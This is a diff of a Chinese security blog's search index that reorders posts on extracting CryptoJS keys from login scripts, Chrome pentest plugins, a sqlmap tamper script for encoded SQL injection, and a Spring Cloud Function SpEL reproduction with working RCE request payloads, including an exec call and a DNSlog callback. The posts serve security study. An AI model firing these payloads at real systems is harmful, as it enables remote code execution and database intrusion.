@@ -33,97 +33,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CryptoJS获取密钥tip</title>
-    <url>/2022/07/07/CryptoJS/</url>
-    <content><![CDATA[<h2 id="CryptoJS获取加密密钥"><a href="#CryptoJS获取加密密钥" class="headerlink" title="CryptoJS获取加密密钥"></a>CryptoJS获取加密密钥</h2><p><strong>网站登录包加密</strong></p>
-<p><img src="https://s2.loli.net/2022/07/07/6Sz4qfG97YJNAIr.png" alt="image-20220707183538777"></p>
-<p><strong>在网站资源搜索AES、DES等字符，定位加密函数并下断点</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">k.a.AES.encrypt(c()(t.data), A, &#123;</span><br><span class="line">                    iv: q,</span><br><span class="line">                    mode: k.a.mode.CBC,</span><br><span class="line">                    padding: k.a.pad.Pkcs7</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://s2.loli.net/2022/07/07/yrn6JMDZBuNs4iw.png" alt="image-20220707183743662"></p>
-<p><strong>获取加密函数A(key)和q(iv)的值</strong></p>
-<p>此处密钥不是明文而是CryptoJS专有的WordArray格式</p>
-<p><img src="https://s2.loli.net/2022/07/07/f54e8Ul3rzabgBS.png" alt="image-20220707184041511"></p>
-<p><strong>本地资源下载</strong></p>
-<p><code>npm install crypto-js</code></p>
-<p>查阅资料可知，WordArray格式一般由<code>CryptoJS.enc.Utf8.parse()</code>方法转换原始字符串而来，由<code>CryptoJS.enc.Utf8.stringify()</code>方法将WordArray转换为原始字符串，那在这里使用<code>CryptoJS.enc.Utf8.stringify()</code>方法即可进行转换</p>
-<p><strong>确定WordArray格式</strong></p>
-<p>在CryptoJS代码中查找<code>CryptoJS.enc.Utf8.stringify()</code>方法，对words和sigBytes进行了解析</p>
-<p><img src="https://s2.loli.net/2022/07/07/yHMU78itdEbX1L5.png" alt="image-20220707185331507"></p>
-<p>使用<code>CryptoJS.enc.Utf8.parse()</code>转换一个字符串，查看下WordArray格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var CryptoJS = require(&quot;crypto-js&quot;);</span><br><span class="line"></span><br><span class="line">var a = CryptoJS.enc.Utf8.parse(&quot;Y1shui1111111111&quot;); //16位密钥</span><br><span class="line"></span><br><span class="line">console.log(a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下：</p>
-<p><img src="https://s2.loli.net/2022/07/07/dbvmplMqA3crJy7.png" alt="image-20220707184830662"></p>
-<p>根据浏览器断点获取的WordArray，转换出key和iv</p>
-<p><img src="https://s2.loli.net/2022/07/07/wqRAuJmNtyoWgnM.png" alt="image-20220707185926290"></p>
-<p>key:</p>
-<p><img src="https://s2.loli.net/2022/07/07/ILK9f4uNmXE3enT.png" alt="image-20220707185641730"></p>
-<p>iv：</p>
-<p><img src="https://s2.loli.net/2022/07/07/Szk5RngHhPEu6MG.png" alt="image-20220707185543105"></p>
-<p><strong>解密明文</strong></p>
-<p><img src="https://s2.loli.net/2022/07/07/ISNJT1ajFzW9cM4.png" alt="image-20220707185741155"></p>
-<p><strong>总结</strong></p>
-<p>文章并不复杂，但中间由于把脚本WordArray位置添加了双引号，导致一直无法转换成功……</p>
-]]></content>
-      <categories>
-        <category>客户端解密</category>
-      </categories>
-      <tags>
-        <tag>JS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Chrome插件</title>
-    <url>/2023/02/10/Chrome%E6%8F%92%E4%BB%B6/</url>
-    <content><![CDATA[<h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="start-me"><a href="#start-me" class="headerlink" title="start.me"></a>start.me</h4><p>自定义首页标签等</p>
-<p><img src="https://s2.loli.net/2023/02/10/Dl84mrZP5CuL36q.png" alt="image-20230209135746231"></p>
-<h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本，功能强大！</p>
-<p>各大视频无需会员解析、CSDN免登录查看全文、百度文库复制等等</p>
-<p><img src="https://s2.loli.net/2023/02/10/d1YI7DlgeQCTMKw.png" alt="image-20230209135844651"></p>
-<h4 id="二维码（生成及识别）"><a href="#二维码（生成及识别）" class="headerlink" title="二维码（生成及识别）"></a>二维码（生成及识别）</h4><p>识别和生成二维码，不再需要手机扫描</p>
-<h4 id="charset"><a href="#charset" class="headerlink" title="charset"></a><strong>charset</strong></h4><p>解决某些页面展示乱码问题，火狐浏览器工具栏自带修复编码功能</p>
-<p><img src="https://s2.loli.net/2023/02/09/vqtB1EC4gNlsTcy.png" alt="image-20230209133729105"></p>
-<h4 id="JavaScript-and-CSS-Code-Beautifier"><a href="#JavaScript-and-CSS-Code-Beautifier" class="headerlink" title="JavaScript and CSS Code Beautifier"></a>JavaScript and CSS Code Beautifier</h4><p>美化前端js、css展示，方便调试前端</p>
-<p><img src="https://s2.loli.net/2023/02/09/jMJwQKOn7mH8o93.png" alt="image-20230209135312709"></p>
-<h4 id="JSONView"><a href="#JSONView" class="headerlink" title="JSONView"></a>JSONView</h4><p>chrome默认展示json无格式，此插件可以展示json的树形结构</p>
-<h4 id="Save-as-MHTML"><a href="#Save-as-MHTML" class="headerlink" title="Save as MHTML"></a>Save as MHTML</h4><p>推荐，打包页面到本地，不用再担心文章被删除了</p>
-<p><img src="https://s2.loli.net/2023/02/09/SRZtNksTqeOW6LM.png" alt="image-20230209135640469"></p>
-<h3 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h3><h4 id="hack-tools"><a href="#hack-tools" class="headerlink" title="hack-tools"></a><strong>hack-tools</strong></h4><p>常用的渗透payload</p>
-<p><img src="https://s2.loli.net/2023/02/09/vwuz2B8YlXQ3CKo.png" alt="image-20230209134106245"></p>
-<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a><strong>hackbar</strong></h4><p>有了burp很少用了</p>
-<p><img src="https://s2.loli.net/2023/02/09/T6yB5hdlIN27zOD.png" alt="image-20230209135004830"></p>
-<h4 id="ie-tab"><a href="#ie-tab" class="headerlink" title="ie tab"></a><strong>ie tab</strong></h4><p>ie无法使用情况下的chrome替代插件</p>
-<p><img src="https://s2.loli.net/2023/02/09/JqXxVYNlktgEH65.png" alt="image-20230209135121881"></p>
-<h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>User-Agent Switcher and Manager</p>
-<p>User-Agent Switcher for Chrome</p>
-<p>修改页面ua</p>
-<p><img src="https://s2.loli.net/2023/02/09/pC7Luiej9yTtEgv.png" alt="image-20230209140155721"></p>
-<h4 id="WebSocket-Test-Client"><a href="#WebSocket-Test-Client" class="headerlink" title="WebSocket Test Client"></a>WebSocket Test Client</h4><p>WebSocket测试客户端</p>
-<p><img src="C:\Users\meng\AppData\Roaming\Typora\typora-user-images\image-20230209140249520.png" alt="image-20230209140249520"></p>
-<h4 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a><strong>SwitchyOmega</strong></h4><p>现在用的比较少了，一般情况下直接用burp内置的浏览器，但是像测试越权等需要开两个页面的场景，还是很好用的</p>
-<p><img src="https://s2.loli.net/2023/02/09/UBDo5PewayWgZEV.png" alt="image-20230209133556244"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="FindSomething"><a href="#FindSomething" class="headerlink" title="FindSomething"></a><strong>FindSomething</strong></h4><p>从前端发现敏感信息</p>
-<p><img src="https://s2.loli.net/2023/02/09/uRad5Nh4QAL1P72.png" alt="image-20230209134550266"></p>
-<h4 id="hunter-snov"><a href="#hunter-snov" class="headerlink" title="hunter snov"></a><strong>hunter</strong> snov</h4><p>邮箱收集，推荐snov</p>
-<p><img src="https://s2.loli.net/2023/02/09/VJwrXdZW8t1cNCU.png" alt="image-20230209134705350"></p>
-<h4 id="IP-域名信息查看"><a href="#IP-域名信息查看" class="headerlink" title="IP 域名信息查看"></a><strong>IP 域名信息查看</strong></h4><p>查看IP、域名信息</p>
-<p><img src="https://s2.loli.net/2023/02/09/18Qmdn7BuNEWsY6.png" alt="image-20230209134755621"></p>
-<h4 id="fofa-pro-view"><a href="#fofa-pro-view" class="headerlink" title="fofa pro view"></a><strong>fofa pro view</strong></h4><p>fofa浏览器插件</p>
-<p><img src="https://s2.loli.net/2023/02/09/Xg2WyKpQS78cZhm.png" alt="image-20230209134905611"></p>
-<h3 id="github相关"><a href="#github相关" class="headerlink" title="github相关"></a>github相关</h3><h4 id="GitZip-for-github"><a href="#GitZip-for-github" class="headerlink" title="GitZip for github"></a><strong>GitZip for github</strong></h4><p>下载github单个文件或文件夹</p>
-<p><img src="https://s2.loli.net/2023/02/09/YkVTqRehfblowE8.png" alt="image-20230209133935758"></p>
-]]></content>
-      <categories>
-        <category>插件</category>
-      </categories>
-      <tags>
-        <tag>Chrome</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo&amp;Gitpage搭建记录</title>
     <url>/2022/03/18/Hexo&amp;Gitpage%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
@@ -218,6 +127,97 @@
       </tags>
   </entry>
   <entry>
+    <title>Chrome插件</title>
+    <url>/2023/02/10/Chrome%E6%8F%92%E4%BB%B6/</url>
+    <content><![CDATA[<h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="start-me"><a href="#start-me" class="headerlink" title="start.me"></a>start.me</h4><p>自定义首页标签等</p>
+<p><img src="https://s2.loli.net/2023/02/10/Dl84mrZP5CuL36q.png" alt="image-20230209135746231"></p>
+<h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本，功能强大！</p>
+<p>各大视频无需会员解析、CSDN免登录查看全文、百度文库复制等等</p>
+<p><img src="https://s2.loli.net/2023/02/10/d1YI7DlgeQCTMKw.png" alt="image-20230209135844651"></p>
+<h4 id="二维码（生成及识别）"><a href="#二维码（生成及识别）" class="headerlink" title="二维码（生成及识别）"></a>二维码（生成及识别）</h4><p>识别和生成二维码，不再需要手机扫描</p>
+<h4 id="charset"><a href="#charset" class="headerlink" title="charset"></a><strong>charset</strong></h4><p>解决某些页面展示乱码问题，火狐浏览器工具栏自带修复编码功能</p>
+<p><img src="https://s2.loli.net/2023/02/09/vqtB1EC4gNlsTcy.png" alt="image-20230209133729105"></p>
+<h4 id="JavaScript-and-CSS-Code-Beautifier"><a href="#JavaScript-and-CSS-Code-Beautifier" class="headerlink" title="JavaScript and CSS Code Beautifier"></a>JavaScript and CSS Code Beautifier</h4><p>美化前端js、css展示，方便调试前端</p>
+<p><img src="https://s2.loli.net/2023/02/09/jMJwQKOn7mH8o93.png" alt="image-20230209135312709"></p>
+<h4 id="JSONView"><a href="#JSONView" class="headerlink" title="JSONView"></a>JSONView</h4><p>chrome默认展示json无格式，此插件可以展示json的树形结构</p>
+<h4 id="Save-as-MHTML"><a href="#Save-as-MHTML" class="headerlink" title="Save as MHTML"></a>Save as MHTML</h4><p>推荐，打包页面到本地，不用再担心文章被删除了</p>
+<p><img src="https://s2.loli.net/2023/02/09/SRZtNksTqeOW6LM.png" alt="image-20230209135640469"></p>
+<h3 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h3><h4 id="hack-tools"><a href="#hack-tools" class="headerlink" title="hack-tools"></a><strong>hack-tools</strong></h4><p>常用的渗透payload</p>
+<p><img src="https://s2.loli.net/2023/02/09/vwuz2B8YlXQ3CKo.png" alt="image-20230209134106245"></p>
+<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a><strong>hackbar</strong></h4><p>有了burp很少用了</p>
+<p><img src="https://s2.loli.net/2023/02/09/T6yB5hdlIN27zOD.png" alt="image-20230209135004830"></p>
+<h4 id="ie-tab"><a href="#ie-tab" class="headerlink" title="ie tab"></a><strong>ie tab</strong></h4><p>ie无法使用情况下的chrome替代插件</p>
+<p><img src="https://s2.loli.net/2023/02/09/JqXxVYNlktgEH65.png" alt="image-20230209135121881"></p>
+<h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>User-Agent Switcher and Manager</p>
+<p>User-Agent Switcher for Chrome</p>
+<p>修改页面ua</p>
+<p><img src="https://s2.loli.net/2023/02/09/pC7Luiej9yTtEgv.png" alt="image-20230209140155721"></p>
+<h4 id="WebSocket-Test-Client"><a href="#WebSocket-Test-Client" class="headerlink" title="WebSocket Test Client"></a>WebSocket Test Client</h4><p>WebSocket测试客户端</p>
+<p><img src="C:\Users\meng\AppData\Roaming\Typora\typora-user-images\image-20230209140249520.png" alt="image-20230209140249520"></p>
+<h4 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a><strong>SwitchyOmega</strong></h4><p>现在用的比较少了，一般情况下直接用burp内置的浏览器，但是像测试越权等需要开两个页面的场景，还是很好用的</p>
+<p><img src="https://s2.loli.net/2023/02/09/UBDo5PewayWgZEV.png" alt="image-20230209133556244"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="FindSomething"><a href="#FindSomething" class="headerlink" title="FindSomething"></a><strong>FindSomething</strong></h4><p>从前端发现敏感信息</p>
+<p><img src="https://s2.loli.net/2023/02/09/uRad5Nh4QAL1P72.png" alt="image-20230209134550266"></p>
+<h4 id="hunter-snov"><a href="#hunter-snov" class="headerlink" title="hunter snov"></a><strong>hunter</strong> snov</h4><p>邮箱收集，推荐snov</p>
+<p><img src="https://s2.loli.net/2023/02/09/VJwrXdZW8t1cNCU.png" alt="image-20230209134705350"></p>
+<h4 id="IP-域名信息查看"><a href="#IP-域名信息查看" class="headerlink" title="IP 域名信息查看"></a><strong>IP 域名信息查看</strong></h4><p>查看IP、域名信息</p>
+<p><img src="https://s2.loli.net/2023/02/09/18Qmdn7BuNEWsY6.png" alt="image-20230209134755621"></p>
+<h4 id="fofa-pro-view"><a href="#fofa-pro-view" class="headerlink" title="fofa pro view"></a><strong>fofa pro view</strong></h4><p>fofa浏览器插件</p>
+<p><img src="https://s2.loli.net/2023/02/09/Xg2WyKpQS78cZhm.png" alt="image-20230209134905611"></p>
+<h3 id="github相关"><a href="#github相关" class="headerlink" title="github相关"></a>github相关</h3><h4 id="GitZip-for-github"><a href="#GitZip-for-github" class="headerlink" title="GitZip for github"></a><strong>GitZip for github</strong></h4><p>下载github单个文件或文件夹</p>
+<p><img src="https://s2.loli.net/2023/02/09/YkVTqRehfblowE8.png" alt="image-20230209133935758"></p>
+]]></content>
+      <categories>
+        <category>插件</category>
+      </categories>
+      <tags>
+        <tag>Chrome</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CryptoJS获取密钥tip</title>
+    <url>/2022/07/07/CryptoJS/</url>
+    <content><![CDATA[<h2 id="CryptoJS获取加密密钥"><a href="#CryptoJS获取加密密钥" class="headerlink" title="CryptoJS获取加密密钥"></a>CryptoJS获取加密密钥</h2><p><strong>网站登录包加密</strong></p>
+<p><img src="https://s2.loli.net/2022/07/07/6Sz4qfG97YJNAIr.png" alt="image-20220707183538777"></p>
+<p><strong>在网站资源搜索AES、DES等字符，定位加密函数并下断点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">k.a.AES.encrypt(c()(t.data), A, &#123;</span><br><span class="line">                    iv: q,</span><br><span class="line">                    mode: k.a.mode.CBC,</span><br><span class="line">                    padding: k.a.pad.Pkcs7</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2022/07/07/yrn6JMDZBuNs4iw.png" alt="image-20220707183743662"></p>
+<p><strong>获取加密函数A(key)和q(iv)的值</strong></p>
+<p>此处密钥不是明文而是CryptoJS专有的WordArray格式</p>
+<p><img src="https://s2.loli.net/2022/07/07/f54e8Ul3rzabgBS.png" alt="image-20220707184041511"></p>
+<p><strong>本地资源下载</strong></p>
+<p><code>npm install crypto-js</code></p>
+<p>查阅资料可知，WordArray格式一般由<code>CryptoJS.enc.Utf8.parse()</code>方法转换原始字符串而来，由<code>CryptoJS.enc.Utf8.stringify()</code>方法将WordArray转换为原始字符串，那在这里使用<code>CryptoJS.enc.Utf8.stringify()</code>方法即可进行转换</p>
+<p><strong>确定WordArray格式</strong></p>
+<p>在CryptoJS代码中查找<code>CryptoJS.enc.Utf8.stringify()</code>方法，对words和sigBytes进行了解析</p>
+<p><img src="https://s2.loli.net/2022/07/07/yHMU78itdEbX1L5.png" alt="image-20220707185331507"></p>
+<p>使用<code>CryptoJS.enc.Utf8.parse()</code>转换一个字符串，查看下WordArray格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var CryptoJS = require(&quot;crypto-js&quot;);</span><br><span class="line"></span><br><span class="line">var a = CryptoJS.enc.Utf8.parse(&quot;Y1shui1111111111&quot;); //16位密钥</span><br><span class="line"></span><br><span class="line">console.log(a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="https://s2.loli.net/2022/07/07/dbvmplMqA3crJy7.png" alt="image-20220707184830662"></p>
+<p>根据浏览器断点获取的WordArray，转换出key和iv</p>
+<p><img src="https://s2.loli.net/2022/07/07/wqRAuJmNtyoWgnM.png" alt="image-20220707185926290"></p>
+<p>key:</p>
+<p><img src="https://s2.loli.net/2022/07/07/ILK9f4uNmXE3enT.png" alt="image-20220707185641730"></p>
+<p>iv：</p>
+<p><img src="https://s2.loli.net/2022/07/07/Szk5RngHhPEu6MG.png" alt="image-20220707185543105"></p>
+<p><strong>解密明文</strong></p>
+<p><img src="https://s2.loli.net/2022/07/07/ISNJT1ajFzW9cM4.png" alt="image-20220707185741155"></p>
+<p><strong>总结</strong></p>
+<p>文章并不复杂，但中间由于把脚本WordArray位置添加了双引号，导致一直无法转换成功……</p>
+]]></content>
+      <categories>
+        <category>客户端解密</category>
+      </categories>
+      <tags>
+        <tag>JS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947</title>
     <url>/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
@@ -261,6 +261,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Spring-Cloud-Function-SpEL-RCE</title>
+    <url>/2022/03/30/Spring-Cloud-Function-SpEL-RCE/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/ZkqtToNXg9W8BLD.png" alt="image-20220403232403602"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName(&quot;81731h.dnslog.cn&quot;)</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/m6fvrOawhydJ7tC.png" alt="image-20220403232423476"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/hktalent/spring-spel-0day-poc">https://github.com/hktalent/spring-spel-0day-poc</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>Spring Cloud Function</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Spring4Shell-CVE-2022-22965</title>
     <url>/2022/04/01/Spring4Shell-CVE-2022-22965/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p>
@@ -282,6 +302,47 @@
       </categories>
       <tags>
         <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqlmap tamper</title>
+    <url>/2022/03/28/sqlmap_tamper/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
+<li>tamper<ul>
+<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
+<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
+</ul>
+</li>
+<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
+<li>js2py库，用于使用python调用js</li>
+</ul>
+<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
+<li>需要调用外部js，即获取到的js加密代码</li>
+</ol>
+<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
+<ol start="2">
+<li><p>js2py库，用于调用js</p>
+<p>​	这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
+<p>​	<code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload处理</p>
+</li>
+</ol>
+<p>​			存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
+<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
+<ol start="4">
+<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
+</ol>
+<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
+<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
+]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
+      <tags>
+        <tag>Sqlmap</tag>
       </tags>
   </entry>
   <entry>
@@ -342,67 +403,6 @@
       </categories>
       <tags>
         <tag>frida</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring-Cloud-Function-SpEL-RCE</title>
-    <url>/2022/03/30/Spring-Cloud-Function-SpEL-RCE/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/04/03/ZkqtToNXg9W8BLD.png" alt="image-20220403232403602"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName(&quot;81731h.dnslog.cn&quot;)</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/04/03/m6fvrOawhydJ7tC.png" alt="image-20220403232423476"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/hktalent/spring-spel-0day-poc">https://github.com/hktalent/spring-spel-0day-poc</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>Spring Cloud Function</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sqlmap tamper</title>
-    <url>/2022/03/28/sqlmap_tamper/</url>
-    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
-<li>tamper<ul>
-<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
-<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
-</ul>
-</li>
-<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
-<li>js2py库，用于使用python调用js</li>
-</ul>
-<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
-<li>需要调用外部js，即获取到的js加密代码</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
-<ol start="2">
-<li><p>js2py库，用于调用js</p>
-<p>​    这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
-<p>​    <code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>payload处理</p>
-</li>
-</ol>
-<p>​            存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
-<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
-<ol start="4">
-<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
-<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
-]]></content>
-      <categories>
